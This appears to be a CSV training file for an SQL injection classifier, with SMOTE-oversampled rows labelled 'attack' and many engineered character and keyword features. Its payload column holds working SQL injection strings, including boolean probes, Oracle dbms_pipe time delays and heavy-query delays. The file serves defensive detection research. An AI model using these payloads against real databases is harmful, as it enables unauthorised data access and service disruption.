id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000075,0.3756813473091202,80.77892654633568,23.110536726832162,3.2778504199292087,17.88946327316784,12.889463273167838,38.0,12.0,0.22144488940343066,0.15954375371530413,0.47044863122976155,0.14856272565150364,0.0,4.0,0.11053672683216131,-1.3877787807814457e-17,0.8894632731678386,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8894632731678387,0.11053672683216131,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000012,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.2505043588096794,75.49974778073033,19.08329129678839,2.910235332633549,14.333165187153554,9.333165187153554,39.83341740642322,12.0,0.18962813499692047,0.1233727833761224,0.5279862377370417,0.1590128438899154,4.0,0.0,0.0,-1.3877787807814457e-17,0.08329129678838854,1.9167087032116115,0.0,6.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.4690871610588296,75.48815701082023,18.837280996393257,2.89743928172578,13.837280996393254,9.488157010820231,40.0,12.162719003606743,0.18341228659453182,0.1255074124297667,0.5299955076183231,0.1610847933573783,4.0,0.0,0.16271900360674363,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.0,0.0,2.162719003606744,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8372809963932564,0.16271900360674368,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000045,0.318166982829845,113.77220368510295,28.92406789503432,4.158567819750449,71.15186420993136,4.848135790068639,22.075932104965684,15.696271580137276,0.6254533000071018,0.042581512694982615,0.1940625714314701,0.13790261586644556,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,2.0,0.0,4.620339475171596,3.848135790068638,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000066,0.5220928866470242,165.35071224088756,35.74768688008453,3.932910159439543,49.738434400422655,24.0,62.11690408029585,29.49537376016906,0.3004604249670286,0.14543176652974968,0.3757509319045103,0.17835687659871136,3.621530320126796,0.0,0.2523131199154691,-1.3877787807814457e-17,0.0,2.0,0.0,11.873843440042265,0.0,2.0,1.0,10.0,1.0,0.0,0.12615655995773462,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8738434400422654,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8738434400422657
SMOTE_000016,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,0.09375673870433697,122.08820349059803,31.955898254700983,3.7977162132937528,45.92649709116831,13.014700581766338,47.08820349059803,16.058802327065354,0.3762151181195584,0.10659879774575556,0.3856695223997728,0.13151656173491322,0.0,3.9852994182336614,0.0,-1.3877787807814457e-17,0.9852994182336615,1.0,0.0,8.044101745299015,0.014700581766338483,1.0,1.0294011635326767,1.9852994182336614,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9852994182336616,0.0,0.0,0.9852994182336614,1.0,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.014700581766338348,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9705988364673233
SMOTE_000017,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.184034973765794,75.90225575656557,25.376775219304193,3.444620283573244,17.0,13.376775219304191,33.86967434208742,11.655806195173952,0.2247127761552234,0.1782890005870243,0.4432944944440172,0.15370372881373515,0.0,4.0,1.0,-1.3877787807814457e-17,0.344193804826048,1.0,0.0,5.3116123903479044,0.0,0.0,0.0,2.344193804826048,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.5560794811112397,79.91569056470183,23.54215471764908,3.2616501437220595,17.45784528235092,12.45784528235092,38.0,12.0,0.2184096011417083,0.1558339569509768,0.4755748958495593,0.15018154605775558,0.0,4.0,0.5421547176490802,-1.3877787807814457e-17,0.45784528235091976,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4578452823509198,0.5421547176490802,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000019,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.879438470088382,70.77683332812035,19.444511905134263,3.076583534990566,9.0,13.0,34.66585713838887,14.11097618973148,0.12842888065283792,0.18550838316521034,0.4861260908124364,0.19993664536951528,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.110976189731479,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,1.4326984381033194,158.08974593224033,35.23589837289613,3.99804563921195,59.398720525464356,15.926923779672096,58.382050813551935,24.382050813551935,0.3751232027073907,0.10057974572299394,0.36977215507716016,0.1545248964924552,4.0,4.0,0.3089745932240321,-1.3877787807814457e-17,0.0,1.691025406775968,0.0,8.0,1.3820508135519356,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.6910254067759678,0.30897459322403203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000021,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000055,0.07582929288970872,90.0,22.33930229966135,2.9221233964230615,8.0,16.0,48.0,18.0,0.0888888888888889,0.17777777777777778,0.5333333333333333,0.2,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000098,0.9067023716677838,70.17373603015145,23.782490686767638,3.5526598271481764,14.17373603015146,16.0,28.0,12.0,0.20163631595983927,0.2281039097257602,0.3991818420200804,0.17107793229432014,4.0,0.0,1.0,-1.3877787807814457e-17,0.608754656616181,2.0,0.0,4.0,0.0,0.0,0.3912453433838189,3.6087546566161812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.23940235560813142,115.23055374621212,28.0,4.113998863531262,77.23055374621211,3.0,23.0,12.0,0.6699313668007376,0.026058049989415452,0.19977838325218517,0.10423219995766184,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,2.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000154,0.864931049175142,80.35144909667224,19.56763273111482,3.08712725348595,16.919081827787053,12.78381636555741,38.43236726888518,12.21618363444259,0.21021202030874503,0.1590567089828128,0.4785797219224683,0.15215154878597387,4.0,0.0,0.21618363444258948,-1.3877787807814457e-17,0.7838163655574105,1.2161836344425896,0.0,6.0,0.0,0.0,0.0,2.216183634442589,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7838163655574104,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,0.24201846992253406,154.10731312365286,32.13733644251494,3.8443083796501187,47.519322451197695,24.0,57.58799067245516,25.0,0.3082391617446754,0.15581210745262752,0.3736444522062101,0.162304278596487,0.0,0.06866822125747252,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.931331778742528,0.0,2.0,1.0,10.0,0.0,0.06866822125747252,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.9313317787425275,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000009,2.2193994002075286,134.79032093059507,32.43300286217037,3.8765133684613455,42.22332379276545,15.522332379276545,51.04466475855309,26.0,0.31218658970755536,0.11524843365405982,0.3792221322343219,0.19334284440406294,2.5669971378296346,0.0,0.9553352414469103,-1.3877787807814457e-17,0.0,1.5223323792765449,0.0,10.477667620723455,0.47766762072345514,2.0,1.0,8.477667620723455,1.0,0.0,0.4776676207234552,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5223323792765449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5223323792765446
SMOTE_000027,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,1.5326405916735288,139.0663877137829,32.63811516330122,3.6130219839797655,43.0,15.0,60.34261804038532,20.723769673397555,0.30991051473917586,0.10810831909506136,0.43294640507461635,0.14903476109114636,3.447539346795107,2.552460653204893,0.0,1.0,0.0,2.0,0.0,10.723769673397554,0.0,0.0,1.0,3.0,1.0,0.6381151633012232,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,2.181646883785444,136.99617224674924,34.0,3.8318385076295325,38.89393099931563,19.26134474846017,52.84089649897345,26.0,0.2842562072057121,0.1390045463489404,0.38604518173528585,0.19069406471006162,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.4734827498289078,0.0,11.0,0.5265172501710922,2.0,1.0,9.473482749828907,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.4734827498289078,0.0,0.5265172501710922,0.4734827498289078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4734827498289076
